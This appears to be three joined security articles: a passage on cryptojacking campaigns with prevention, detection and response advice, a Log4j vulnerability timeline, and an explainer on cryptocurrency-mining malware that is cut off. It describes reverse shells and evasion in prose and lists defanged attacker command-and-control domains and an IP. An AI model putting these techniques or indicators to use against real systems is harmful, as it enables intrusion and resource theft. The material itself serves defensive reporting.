<p>“The profitability and ease of conducting cryptojacking at scale makes this type of attack low-hanging fruit,” said Matt Muir, security researcher for Cado Security,&nbsp;<a href="https://www.cadosecurity.com/tales-from-the-honeypot-watchdog-evolves-with-a-new-multi-stage-cryptojacking-attack/" rel="noreferrer noopener" target="_blank">in a blog post</a>&nbsp;explaining that cloud-based attacks are particularly lucrative. “This will likely continue for as long as users continue to expose services such as Docker and Redis to untrusted networks.”</p>



<h2>Why cryptojacking is popular</h2>



<p>According to a&nbsp;<a href="https://reasonlabs.com/reports/reasonlabs-report.pdf" rel="noreferrer noopener" target="_blank">report</a>&nbsp;by ReasonLabs, in the last year 58.4% of all Trojans detected were cryptojacking coin miners. Meantime, another study by SonicWall found that 2021 was the worst year to date for cryptojacking attacks, with the category logging 97.1 million attacks over the course of the year. These numbers are so strong because cryptojacking is virtually minting money for cybercriminals.</p>



<p>When a crook can mine for cryptocurrency on a seemingly limitless pool of free compute resources from victim machines, the upside for them is huge. Even with the precipitous drop in Bitcoin valuation this spring that brought it below the $30,000 level, cryptojackers’ illicit margins still make business sense as the value of what they mine far outstrips the costs of their criminal infrastructure.</p>



<h2>Real-world cryptojacking examples</h2>



<h3><strong>WatchDog targets Docker Engine API endpoints and Redis servers</strong></h3>



<p>A honeypot from the security research team at Cado Labs&nbsp;<a href="https://www.cadosecurity.com/tales-from-the-honeypot-watchdog-evolves-with-a-new-multi-stage-cryptojacking-attack/" rel="noreferrer noopener" target="_blank">discovered</a>&nbsp;a multi-stage cryptojacking attack that targets exposed Docker Engine API endpoints and Redis servers, and can propogate in a worm-like fashion. The attack is perpetrated by the WatchDog attack group, which has been particularly active in late 2021 and 2022 with numerous cryptojacking campaigns.</p>



<h3><strong>Alibaba ECS instances in cryptomining crosshairs</strong></h3>



<p>TeamTNT was one of the first hacking groups to shift cryptojacking focus heavily to cloud-oriented services. Researchers with TrendMicro in late 2021&nbsp;<a href="https://www.trendmicro.com/en_us/research/21/k/groups-target-alibaba-ecs-instances-for-cryptojacking.html" rel="noreferrer noopener" target="_blank">reported</a>&nbsp;that this group, along with rivals like the Kinsig gang, were conducting cryptojacking campaigns that installed miners in Alibaba Elastic Computing Service (ECS) instances and disabling security features to evade detection.&nbsp;</p>



<h3><strong>Miner bots and backdoors use Log4J to attack VMware Horizon servers</strong></h3>



<p>The Log4Shell vulnerability has been a boon to cryptojacking attackers in 2022. In one marked example, Sophos researchers&nbsp;<a href="https://news.sophos.com/en-us/2022/03/29/horde-of-miner-bots-and-backdoors-leveraged-log4j-to-attack-vmware-horizon-servers/" rel="noreferrer noopener" target="_blank">found</a>&nbsp;earlier this year that a ‘horde’ of attackers were targeting VMware Horizon servers to deliver a range of crypojacking payloads that included the z0Miner, the JavaX miner and at least two XMRig variants, Jin and Mimu cryptocurrency miner bots.</p>



<h3><strong>Supply chain attacks via npm libraries</strong></h3>



<p>The software supply chain security experts at Sonatype in fall of 2021 sounded the alarm on malicious cryptomining packages hiding in npm, the JavaScript package repository used by developers worldwide. At the time it found a trio of packages, at least one of which was impersonating a popular, legitimate library used by developers called “ua-parser-js,” which gets over 7 million weekly downloads and would be an ideal way to lure in developers to accidentally download a malicious bit of code and install it in their software.</p>



<p>A few months after that report, researchers WhiteSource (now Mend) released an&nbsp;<a href="https://www.mend.io/npm-threat-report-for-javascript-package-registry/" rel="noreferrer noopener" target="_blank">additional report</a>&nbsp;that showed npm is swarming with malicious code—as many as 1,300 malicious packages that include cryptojacking and other nefarious behavior.</p>



<h3><strong>Romanian attackers target Linux machines with cryptomining malware</strong></h3>



<p>Last summer Bitdefender&nbsp;<a href="https://www.bitdefender.com/blog/labs/how-we-tracked-a-threat-group-running-an-active-cryptojacking-campaign" rel="noreferrer noopener" target="_blank">discovered</a>&nbsp;a Romanian threat group that was targeting Linux-based machines with SSH credentials to deploy Monero mining malware. The tools they used were distributed on an as-a-service model. This example was on the spear tip of what appears to be a growing trend of Linux system cryptomining attacks. A&nbsp;<a href="https://ir.vmware.com/websites/vmware/English/2120/us-press-release.html?airportNewsID=47b6e25a-5a8b-4189-b20d-99a6da9b1663" rel="noreferrer noopener" target="_blank">report</a>&nbsp;earlier this year from VMware detailed a growing targeting of Linux-based multi-cloud environments, particularly using the XMRig mining software.</p>



<p>“Many of the cryptomining samples from Linux-based systems have some relationship to the XMRig application,” explained the report, which showed that 89% of cryptomining attacks used XMRig-related libraries. “Therefore, when XMRig-specific libraries and modules in Linux binaries are identified, it is likely evidence of potential cryptomining behavior.</p>



<h3><strong>CoinStomp uses sophisticated evasion tactics</strong></h3>



<p>CoinStop is another cryptojacking campaign recently discovered to be targeting Asian cloud service providers (CSPs). This one distinguished itself by its anti-forensics and evasion measures. These included timestomping to manipulate system timestamps, removal of system cryptographic policies, and the use of the he /dev/tcp device file to create a reverse shell session, explained Cado’s Muir in a&nbsp;<a href="https://www.cadosecurity.com/coinstomp-malware-family-targets-asian-cloud-service-providers/" rel="noreferrer noopener" target="_blank">report</a>&nbsp;on the attack.</p>



<h3><strong>Cryptocurrency farm found in warehouse</strong></h3>



<p>Cryptojackers can sometimes go to great lengths to steal not only processing power but also energy and network resources from corporate infrastructure. Last year Darktrace analysts&nbsp;<a href="https://www.darktrace.com/en/blog/crypto-mining-malware-uncovering-a-cryptocurrency-farm-in-a-warehouse/" rel="noreferrer noopener" target="_blank">highlighted</a>&nbsp;an anonymous example from one of its clients where it discovered a cryptomining farm in a warehouse that was disguised inside an unassuming set of cardboard boxes. Inside was a stealthy rig running multiple GPUs that were hooked into the company’s network power,</p>



<h2>How to prevent cryptojacking</h2>



<p>As it has evolved into a multi-vector attack that spans across endpoint, server, and cloud resources, preventing cryptojacking takes an orchestrated and well-rounded defense strategy. The following steps can help prevent cryptojacking from running rampant on enterprise resources.</p>



<p><strong>Employ strong endpoint protection:</strong>&nbsp;The foundation of that is using endpoint protection and anti-malware that’s capable of detecting cryptominers, as well as keeping web filters up to date and managing browser extension to minimize risk of browser-based scripts from executing. Organizations should ideally look for endpoint protection platforms that can extend out to servers and beyond.</p>



<p><strong>Patch and harden servers (and everything else).</strong>&nbsp;Cryptojackers tend to look for the lowest hanging fruit that they can quietly harvest—that includes scanning for publicly exposed servers containing older vulnerabilities. Basic server hardening that includes patching, turning off unused services, and limiting external footprints can go a long way toward minimizing the risk of server-based attacks.</p>



<p><strong>Use software composition analysis.&nbsp;</strong><a href="https://www.csoonline.com/article/3640808/software-composition-analysis-explained-and-how-it-identifies-open-source-software-risks.html" rel="noreferrer noopener" target="_blank">Software composition analysis (SCA)</a>&nbsp;tools provide better visibility into what components are being used within software to prevent supply chain attacks that leverage coin mining scripts.</p>



<p><strong>Hunt down cloud misconfigurations.&nbsp;</strong>One of the most impactful ways organizations can stop cryptojacking in the cloud is by tightening cloud and container configurations. That means finding cloud services exposed to the public internet without proper authentication, rooting out exposed API servers, and eliminating credentials and other secrets stored in developer environments and hardcoded into applications.</p>



<h2><strong>How to detect cryptojacking</strong></h2>



<p>Cryptojacking is a classic low-and-slow cyberattack designed to leave minimal signs behind to avoid long-term detection. While endpoint protection platforms and endpoint detection and response technologies have come a long way in alerting to cryptojacking attacks, the bad guys are masters of evasion on this front and detecting illicit coin miners can still prove difficult, especially when only a few systems are compromised. The following are some additional methods for flagging signs of cryptojacking.</p>



<p><strong>Train your help desk to look for signs of cryptomining.</strong>&nbsp;Sometimes the first indication on user endpoints is a spike in help desk complaints about slow computer performance. That should raise a red flag to investigate further, as could devices over-heating or poor battery performance in mobile devices.</p>



<p><strong>Deploy a network monitoring solution.</strong>&nbsp;Network monitoring tools can offer a powerful tool in picking up on the kinds of web traffic and outbound C2 traffic that indicates cryptojacking activity, no matter the device it is coming from.</p>



<p>“If you have good egress filtering on a server where you’re watching for outbound connection initiation, that can be good detection for [cryptomining malware],” ],” says Travis Farral, vice president and CISO at Archaea Energy. He warns, though, that cryptominer authors can write their malware to avoid that detection method.</p>



<p><strong>Use cloud monitoring and container runtime security.&nbsp;</strong>Evolving tools like cloud monitoring and container runtime security scanning can offer additional visibility into cloud environments that may be impacted by unauthorized cryptominers. Cloud providers are baking in this kind of visibility into their service, sometimes as add-ons. For instance, Google Cloud expanded its Security Command Center earlier this year to include what it calls its Virtual Machine Threat Detection (VMTD) to pick up on signs of cryptomining in the cloud, among other cloud threats.</p>



<p><strong>Engage in regular threat hunts.&nbsp;</strong>Since so many cryptojacking attacks are stealthy and leave few tracks, organizations may need to take more active measures like threat hunting to regularly seek out subtle signs of compromise and follow through with investigations.</p>



<p>“Endpoint security and SOC teams should invest time into active exercises and threat hunts instead of waiting around for something potentially catastrophic to happen,” LogRhythm’s Vincent says.</p>



<p><strong>Monitor your websites for cryptomining code</strong>. Farral warns that cryptojackers are finding ways to place bits of Javascript code on web servers. “The server itself isn’t the target, but anyone visiting the website itself [risks infection],” he says. He recommends regularly monitoring for file changes on the web server or changes to the pages themselves.</p>



<h2><strong>How to respond to a cryptojacking attack</strong></h2>



<p>After illicit cryptomining activity has been detected, responding to a cryptojacking attack should follow standard cyber incident response steps that include containment, eradication, recovery, and lessons learned. Some tips for how to respond to a cryptojacking attack include:</p>



<p><strong>Kill web-delivered scripts.&nbsp;</strong>For in-browser JavaScript attacks, the solution is simple once cryptomining is detected: Kill the browser tab running the script. IT should note the website URL that’s the source of the script and update the company’s web filters to block it.</p>



<p><strong>Shut down compromised container instances.&nbsp;</strong>Immutable cloud infrastructure like container instances that are compromised with coin miners can also be handled simply, by shutting down infected container instances and starting fresh. However, organizations must dig into the root causes that led to the container compromise in the first place. This means looking for signs that the container dashboard and credentials have been compromised and examining connected cloud resources for signs of compromise. A key step is ensuring that the fresh new container image to replace the old one isn’t similarly configured.</p>



<p><strong>Reduce permissions and regenerate API keys.&nbsp;</strong>Eradicating and fully recovering from cloud-based cryptojacking will require organizations to reduce permissions to impacted cloud resources (and those connected to them) and regenerating API keys to prevent attackers from walking right back into the same cloud environment.</p>



<p><strong>Learn and adapt.</strong>&nbsp;Use the experience to better understand how the attacker was able to compromise your systems. Update your user, helpdesk, IT, and SOC analyst training so they are better able to identify cryptojacking attempts and respond accordingly.</p>



<p><em>Editor’s note: This article, orginally published in February 2018, has been updated to include new research, best practices, and cryptojacking examples.</em></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h1>The Apache Log4j vulnerabilities: A timeline</h1>



<h3>The Apache Log4j vulnerability has impacted organizations around the globe. Here is a timeline of the key events surrounding the Log4j exploit as they have unfolded.</h3>



<p>The&nbsp;<a href="https://www.csoonline.com/article/3644472/apache-log4j-vulnerability-actively-exploited-impacting-millions-of-java-based-apps.html" rel="noreferrer noopener" target="_blank">Apache Log4j vulnerability</a>&nbsp;has made global headlines since it was discovered in early December. The flaw has impacted vast numbers of organizations around the world as security teams have scrambled to mitigate the associated risks. Here is a timeline of the key events surrounding the Log4j vulnerability as they have unfolded.</p>



<h2><strong>Thursday, December 9: Apache Log4j zero-day exploit discovered</strong></h2>



<p>Apache released details on a critical vulnerability in Log4j, a logging library used in millions of Java-based applications. Attackers began exploiting the flaw (CVE-2021-44228) – dubbed “Log4Shell”, which was rated 10 out of 10 on the CVSS vulnerability rating scale. It could lead to remote code execution (RCE) on underlying servers that run vulnerable applications. “An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled,” Apache developers wrote in an advisory. A fix for the issue was made available with the release of Log4j 2.15.0 as security teams from around the globe worked to protect their organizations. Businesses were urged to install the latest version.</p>



<h2><strong>Friday, December 10: UK NCSC issues Log4j warning to UK organizations</strong></h2>



<p>As the fallout from the vulnerability continued, the UK’s National Cyber Security Centre (NCSC) issued a&nbsp;<a href="https://www.ncsc.gov.uk/news/apache-log4j-vulnerability" rel="noreferrer noopener" target="_blank">public warning</a>&nbsp;to UK companies about the flaw and outlined strategies for mitigation. The NCSC advised all organizations to install the latest update immediately wherever Log4j was known to be used. “This should be the first priority for all UK organizations using software that is known to include Log4j. Organizations should update both internet-facing and non-internet facing software,” the statement read. Businesses were also urged to seek out unknown instances of Log4j and deploy protective network monitoring/blocking.</p>



<h2><strong>Saturday, December 11: CISA director comments on “urgent challenge to network defenders”</strong></h2>



<p>Much like the UK’s NCSC, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) publicly responded to the Log4j vulnerability with director Jen Easterly reflecting upon the urgent challenge it presented to network defenders. “CISA is working closely with our public and private sector partners to proactively address a critical vulnerability affecting products containing the Log4j software library,” she said in a&nbsp;<a href="https://www.cisa.gov/news/2021/12/11/statement-cisa-director-easterly-log4j-vulnerability" rel="noreferrer noopener" target="_blank">statement</a>. “We are taking urgent action to drive mitigation of this vulnerability and detect any associated threat activity. We have added this vulnerability to our catalog of known exploited vulnerabilities, which compels federal civilian agencies – and signals to non-federal partners – to urgently patch or remediate this vulnerability. We are proactively reaching out to entities whose networks may be vulnerable and are leveraging our scanning and intrusion detection tools to help government and industry partners identify exposure to or exploitation of the vulnerability.”</p>



<p>CISA recommended asset owners to take three additional, immediate steps to help mitigate the vulnerability:</p>



<ul>
<li>Enumerate any external facing devices that have Log4j installed</li>



<li>Ensure security operations centers are actioning every single alert on the devices that fall into the category above</li>



<li>Install a web application firewall with rules that automatically update so that security operations centers (SOCs) can concentrate on fewer alerts</li>
</ul>



<h2><strong>Tuesday, December 14: Second Log4j vulnerability carrying denial-of-service threat detected, new patch released</strong></h2>



<p>A second vulnerability impacting Apache Log4j was discovered. The new exploit, CVE 2021-45046, allowed malicious actors to craft malicious input data using a JNDI lookup pattern to create denial-of-service (DoS) attacks, according to the&nbsp;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" rel="noreferrer noopener" target="_blank">CVE description</a>. A new&nbsp;<a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank">patch for the exploit</a>&nbsp;was made available which removed support for message lookup patterns and disabled JNDI functionality by default, with the Log4j 2.15.0 fix for the original flaw incomplete in certain non-default configurations.</p>



<p>“While CVE-2021-45046 is less severe than the original vulnerability, it becomes another vector for threat actors to conduct malicious attacks against unpatched or improperly patched systems,” Amy Chang, head of risk and response at Resilience, told CSO shortly after the flaw was discovered. “The incomplete patch to CVE-2021-44228 could be abused to craft malicious input data, which could result in a DoS attack. A DoS attack can shut down a machine or network and render it inaccessible to its intended users,” she added. Organizations were advised to update to Log4j: 2.16.0 as soon as possible.</p>



<h2><strong>Friday, December 17: Third Log4j vulnerability revealed, new fix made available</strong></h2>



<p>Apache published details of a third major Log4j vulnerability and made yet another fix available. This was an infinite recursion flaw rated 7.5 out of 10. “The Log4j team has been made aware of a security vulnerability,&nbsp;<a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank">CVE-2021-45105</a>, that has been addressed in&nbsp;<a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank">Log4j 2.17.0</a>&nbsp;for Java 8 and up,” it wrote. “Apache Log4j2 versions 2.0-alpha1 through 2.16.0 did not protect from uncontrolled recursion from self-referential lookups. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process. This is also known as a DoS (denial-of-service) attack.”</p>



<p>Apache also outlined the following mitigations:</p>



<ul>
<li>In PatternLayout in the logging configuration, replace Context Lookups like ${ctx:loginId}or $${ctx:loginId} with Thread Context Map patterns (%X, %mdc, or %MDC)</li>



<li>Otherwise, in the configuration, remove references to Context Lookups like ${ctx:loginId} or $${ctx:loginId} where they originate from sources external to the application such as HTTP headers or user input</li>
</ul>



<h2><strong>Monday, December 20: Log4j exploited to install Dridex and Meterpreter</strong></h2>



<p>Cybersecurity research group Cryptolaemus warned that the&nbsp;<a href="https://twitter.com/Cryptolaemus1/status/1472939659760185346" rel="noreferrer noopener" target="_blank">Log4j vulnerability was being exploited</a>&nbsp;to infect Windows devices with the Dridex banking Trojan and Linux devices with Meterpreter. Dridex is a form of malware that steals bank credentials via a system that uses macros from Microsoft Word, while Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker can explore a target machine and execute code. Cryptolaemus member Joseph Roosen told&nbsp;<a href="https://www.bleepingcomputer.com/news/security/log4j-vulnerability-now-used-to-install-dridex-banking-malware/" rel="noreferrer noopener" target="_blank">BleepingComputer</a>&nbsp;that threat actors use the Log4j RMI (Remote Method Invocation) exploit variant to force vulnerable devices to load and execute a Java class from an attacker-controlled remote server.</p>



<h2><strong>Wednesday, December 22: Data shows 10% of all assets vulnerable to Log4Shell</strong></h2>



<p>Data released by cybersecurity vendor Tenable revealed that that one in 10 of all assets were vulnerable to Log4Shell, while 30% of organizations had not begun scanning for the bug. “Of the assets that have been assessed, Log4Shell has been found in approximately 10% of them, including a wide range of servers, web applications, containers and IoT devices,” read a&nbsp;<a href="https://www.tenable.com/blog/one-in-10-assets-assessed-are-vulnerable-to-log4shell?utm_source=charge&amp;utm_medium=social&amp;utm_campaign=internal-comms" rel="noreferrer noopener" target="_blank">Tenable blog posting</a>. “Log4Shell is pervasive across all industries and geographies. One in 10 corporate servers being exposed. One in 10 web applications and so on. One in 10 of nearly every aspect of our digital infrastructure has the potential for malicious exploitation via Log4Shell.”</p>



<p>The vendor warned that Log4Shell carries a greater potential threat than EternalBlue (exploited in the WannaCry attacks) because of the pervasiveness of Log4j across both infrastructure and applications. “No single vulnerability in history has so blatantly called out for remediation. Log4Shell will define computing as we know it, separating those that put in the effort to protect themselves and those comfortable being negligent,” it added.</p>



<h2><strong>Tuesday, January 4: FTC tells companies to patch Log4j vulnerability, threatens legal action</strong></h2>



<p>The Federal Trade Commission (FTC) urged U.S. organizations to patch the Log4Shell vulnerability immediately or risk facing punitive action from the agency. “When vulnerabilities are discovered and exploited, it risks a loss or breach of personal information, financial loss, and other irreversible harms. The duty to take reasonable steps to mitigate known software vulnerabilities implicates laws including, among others, the Federal Trade Commission Act and the Gramm Leach Bliley Act,” the&nbsp;<a href="https://www.ftc.gov/news-events/blogs/techftc/2022/01/ftc-warns-companies-remediate-log4j-security-vulnerability" rel="noreferrer noopener" target="_blank">FTC said</a>. It added that it is critical that companies and their vendors relying on Log4j act now to reduce the likelihood of harm to consumers and to avoid FTC legal action. “The FTC intends to use its full legal authority to pursue companies that fail to take reasonable steps to protect consumer data from exposure as a result of Log4j, or similar known vulnerabilities in the future.”</p>



<h2><strong>Monday, January 10: Microsoft warns of China-based ransomware operator exploiting Log4Shell</strong></h2>



<p>Microsoft updated its&nbsp;<a href="https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/#NightSky" rel="noreferrer noopener" target="_blank">Log4j vulnerability guidance page</a>&nbsp;with details of a China-based ransomware operator (DEV-0401) targeting internet-facing systems and deploying the NightSky ransomware. “As early as January 4, attackers started exploiting the CVE-2021-44228 vulnerability in internet-facing systems running VMware Horizon,” it wrote. “DEV-0401 has previously deployed multiple ransomware families including LockFile, AtomSilo, and Rook, and has similarly exploited Internet-facing systems running Confluence (CVE-2021-26084) and on-premises Exchange servers (CVE-2021-34473).” Based on Microsoft’s analysis, attackers were discovered to be using command and control (CnC) servers that spoof legitimate domains. These include service[.]trendmrcio[.]com, api[.]rogerscorp[.]org, api[.]sophosantivirus[.]ga, apicon[.]nvidialab[.]us, w2zmii7kjb81pfj0ped16kg8szyvmk.burpcollaborator[.]net, and 139[.]180[.]217[.]203.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-medium-font-size">Security 101: The Impact of Cryptocurrency-Mining Malware</p>



<p>The Australian government has just&nbsp;<a href="http://www.budget.gov.au/2017-18/content/glossies/factsheets/html/FS_innovation.htm">recognized</a>&nbsp;digital currency as a legal payment method. Since July 1, purchases done using digital currencies such as bitcoin are exempt from the country’s Goods and Services Tax to avoid double taxation. As such, traders and investors will not be levied taxes for buying and selling them through legal exchange platforms.</p>



<p>Japan, which&nbsp;<a href="http://www.businessinsider.com/bitcoin-price-spikes-as-japan-recognizes-it-as-a-legal-payment-method-2017-4">legitimized</a>&nbsp;bitcoin as a form of payment last April, already&nbsp;<a href="http://asia.nikkei.com/Business/Trends/Bitcoin-seen-spreading-to-20-000-Japanese-merchants">expects</a>&nbsp;more than 20,000 merchants to accept bitcoin payments. Other countries are joining the bandwagon, albeit partially:&nbsp;<a href="http://www.ey.com/ch/en/newsroom/news-releases/news-release-ey-switzerland-accepts-bitcoins-for-payment-of-its-services">businesses</a>&nbsp;and some of the&nbsp;<a href="http://www.reuters.com/article/us-swiss-fintech-cryptovalley-idUSKCN11E0L9">public organizations</a>&nbsp;in Switzerland,&nbsp;<a href="https://news.bitcoin.com/the-libertarian-city-liberstad-in-norway-is-moving-forward-using-bitcoin-as-primary-currency/">Norway</a>, and the&nbsp;<a href="https://www.technologyreview.com/s/534011/a-weekend-in-bitcoin-city-arnhem-the-netherlands/">Netherlands</a>. In a recent&nbsp;<a href="https://www.jbs.cam.ac.uk/fileadmin/user_upload/research/centres/alternative-finance/downloads/2017-global-cryptocurrency-benchmarking-study.pdf">study</a>, unique, active users of cryptocurrency wallets are pegged between 2.9 and 5.8 million, most of which are in North America and Europe.&nbsp;</p>



<p>But what does the acceptance and adoption of digital currencies have to do with online threats? A lot, actually. As cryptocurrencies like bitcoin gain real-world traction, so will cybercriminal threats that abuse it. But how, exactly? What does this mean to businesses and everyday users?</p>



<h2>What is cryptocurrency?</h2>



<p>Cryptocurrency is an encrypted data string that denotes a unit of currency. It is monitored and organized by a peer-to-peer network also known as a blockchain, which also serves as a secure ledger of transactions, e.g., buying, selling, and transferring. Unlike physical money, cryptocurrencies are decentralized, which means they are not issued by governments or other financial institutions.&nbsp;</p>



<p>Cryptocurrencies are created (and secured) through cryptographic algorithms that are maintained and confirmed in a process called mining, where a network of computers or specialized hardware such as application-specific integrated circuits (ASICs) process and validate the transactions. The process incentivizes the miners who run the network with the cryptocurrency.</p>



<h2>Bitcoin isn’t the be-all and end-all</h2>



<p>There are actually&nbsp;<a href="https://coinmarketcap.com/currencies/views/all/">over 700 cryptocurrencies</a>, but only some are readily traded and even less have market capitalization above $100 million. Bitcoin, for instance, was created by Satoshi Nakamoto (pseudonym) and released in 2009 as open-source code. Blockchain technology made it all work, providing a system where data structures (blocks) are broadcasted, validated, and registered in a public, distributed database through a network of communication endpoints (nodes).&nbsp;</p>



<p>While bitcoin is the most famous cryptocurrency, there are other popular alternatives. Ethereum took “smart contracts” up a notch by making the programming languages needed to code them more accessible to developers. Agreements, or conditional/if-then transactions, are written as code and executed (as long as requirements are met) in Ethereum’s blockchain.&nbsp;</p>



<p>Ethereum, however, earned notoriety after a hacker&nbsp;<a href="https://www.wired.com/2016/06/50-million-hack-just-showed-dao-human/">exploited</a>&nbsp;a vulnerability in the Digital Autonomous Organization (DAO) running on Ethereum’s software, siphoning US $50 million worth of ether (Ethereum’s currency). This resulted in the development of Ethereum Classic, based the original blockchain, and Ethereum, its upgraded version (via a hard fork).</p>



<p>There are also other notable cryptocurrencies: Litecoin, Dogecoin, Monero. Litecoin is a purportedly technical improvement of Bitcoin that is capable of faster turnarounds via its Scrypt mining algorithm (Bitcoin uses SHA-256). The Litecoin Network is able to produce 84 million Litecoins—four times as many cryptocurrency units issued by Bitcoin. Monero is notable for its use of ring signatures (a type of digital signature) and CryptoNote application layer protocol to protect the privacy of its transactions—amount, origin, and destination. Dogecoin, which was initially developed for educational or entertainment purposes, was intended for a broader demographic. Capable of generating uncapped dogecoins, it also uses Scrypt to drive the currency along.</p>



<h2>Cryptocurrency mining also drew cybercriminal attention</h2>



<p>Cryptocurrencies have no borders—anyone can send them anytime anywhere, without delays or additional/hidden charges from intermediaries. Given their nature, they are more secure from fraud and identity theft as cryptocurrencies cannot be counterfeited, and personal information is behind a cryptographic wall.&nbsp;</p>



<p>Unfortunately, the same apparent profitability, convenience, and pseudonymity of cryptocurrencies also made them ideal for cybercriminals, as&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/definition/ransomware">ransomware</a>&nbsp;operators showed. The increasing popularity of cryptocurrencies coincide with the incidences of malware that infect systems and devices, turning them into armies of cryptocurrency-mining machines.&nbsp;</p>



<p>Cryptocurrency mining is a computationally intensive task that requires significant resources from dedicated processors, graphics cards, and other hardware. While mining does generate money, there are many caveats. The profit is relative to a miner’s investment on the hardware, not to mention the electricity costs to power them.&nbsp;</p>



<p>Cryptocurrencies are mined in blocks; in bitcoin, for instance, each time a certain number of hashes are solved, the number of bitcoins that can be awarded to the miner per block is halved. Since the bitcoin network is designed to generate the cryptocurrency every 10 minutes, the difficulty of solving another hash is adjusted. And as mining power&nbsp;<a href="https://bitcoin.org/en/developer-guide#proof-of-work">increases</a>, the resource requirement for mining a new block piles up. Payouts are relatively small and eventually decrease every four years—in 2016, the reward for mining a block was&nbsp;<a href="http://www.reuters.com/article/us-markets-bitcoin-mining-idUSKCN0ZO2CW">halved</a>&nbsp;to 12.5 BTC (or $32,000 as of July 5, 2017). Consequently, many join forces into pools to make mining more efficient. Profit is divided between the group, depending on how much effort a miner exerted.</p>



<h2>Cryptocurrency-mining malware use similar attack vectors</h2>



<p>Bad guys turn to using malware to skirt around these challenges. There is, however a caveat for cybercriminal miners: internet-connected devices and machines, while fast enough to process network data, don’t have extensive number-crunching capabilities. To offset this, cryptocurrency-mining malware are designed to zombify&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/definition/botnet">botnets</a>&nbsp;of computers to perform these tasks. Others avoided subtlety altogether—in 2014, Harvard’s supercomputer cluster Odyssey was&nbsp;<a href="http://www.thecrimson.com/article/2014/2/20/harvard-odyssey-dogecoin/">used to illicitly mine dogecoins</a>. During the same year, a similar&nbsp;<a href="http://www.bbc.com/news/technology-27779030">incident</a>&nbsp;happened to US agency National Science Foundation’s own supercomputers. In early February 2017, one of the US Federal Reserve’s servers was&nbsp;<a href="http://www.ibtimes.com/bitcoin-mining-employee-federal-reserve-fined-suspended-using-government-server-mine-2484185">misused to mine for bitcoins</a>.&nbsp;</p>



<p>Cryptocurrency-mining malware employ the same modus operandi as many other threats—from malware-toting spam emails and downloads from malicious URLs to junkware and potentially unwanted applications (PUAs). In January 2014, a&nbsp;<a href="http://www.bbc.com/news/technology-25653664">vulnerability in Yahoo!’s Java-based advertisement network was compromised</a>, exposing European end users to&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/definition/malvertisement">malvertisements</a>&nbsp;that delivered a bitcoin-mining malware. A month before it, German law enforcement&nbsp;<a href="https://www.scmagazine.com/german-police-arrest-bitcoin-hackers/article/543183/">arrested</a>&nbsp;hackers for purportedly using malware to mine over $954,000 worth of bitcoins.</p>



<p>We’ve seen the&nbsp;<a href="https://www.trendmicro.com/vinfo/de/threat-encyclopedia/web-attack/93/cybercriminals-unleash-bitcoinmining-malware">emergence of hacking tools and backdoors related to cybercriminal bitcoin mining</a>&nbsp;as early as 2011, and we’ve since seen a variety of cryptocurrency-mining threats that add more capabilities, such as&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/bitcoin-mining-botnet-found-with-ddos-capabilities/">distributed denial-of-service</a>&nbsp;and&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/malicious-links-on-twitter-lead-to-bitcoin-mining/">URL spoofing</a>. Another even tried to&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/trojan-disguised-as-trend-micro-component-drops-bitcoin-mining-malware/">masquerade as a component for one of Trend Micro’s products</a>. In 2014, the threat&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mobile-malware-mines-dogecoins-and-litecoins-for-bitcoin-payout/">crossed over to Android devices as Kagecoin</a>, capable of mining bitcoin, litecoin, and dogecoin. A&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-rats-emerge-from-leaked-njw0rm-source-code/">remote access Trojan (RAT) njrat/Njw0rm readily shared in the Middle Eastern underground</a>&nbsp;was modified to add bitcoin-mining functionality. The same was done to an old&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/old-java-rat-updates-includes-litecoin-plugin/">Java RAT that can mine litecoin</a>.&nbsp;</p>



<p>This year’s notable cryptocurrency-mining malware so far are&nbsp;<a href="https://www.proofpoint.com/us/threat-insight/post/adylkuzz-cryptocurrency-mining-malware-spreading-for-weeks-via-eternalblue-doublepulsar">Adylkuzz</a>, CPUMiner/EternalMiner, and Linux.MulDrop.14. All exploit vulnerabilities.&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/wannacry-uiwix-ransomware-monero-mining-malware-follow-suit/">Adylkuzz leverages EternalBlue</a>, the same security flaw that&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/massive-wannacrywcry-ransomware-attack-hits-various-countries/">WannaCry</a>&nbsp;ransomware&nbsp;used to destructive effect, while CPUMiner/EternalMiner used&nbsp;<a href="http://www.securityweek.com/sambacry-flaw-exploited-deliver-cryptocurrency-miner">SambaCry</a>, a vulnerability in interoperability software suite Samba. Linux.MulDrop.14, a Linux Trojan,&nbsp;<a href="http://www.zdnet.com/article/linux-malware-enslaves-raspberry-pi-to-mine-cryptocurrency/">targets</a>&nbsp;Raspberry Pi devices. These threats infected devices and machines and turned them into monero-mining botnets.</p>



<h2>Cryptocurrency-mining malware’s impact makes them a credible threat</h2>



<p>Cryptocurrency-mining malware steal the resources of infected machines, significantly affecting their performance and increasing their wear and tear. An infection also involves other costs, like increased power consumption.&nbsp;</p>



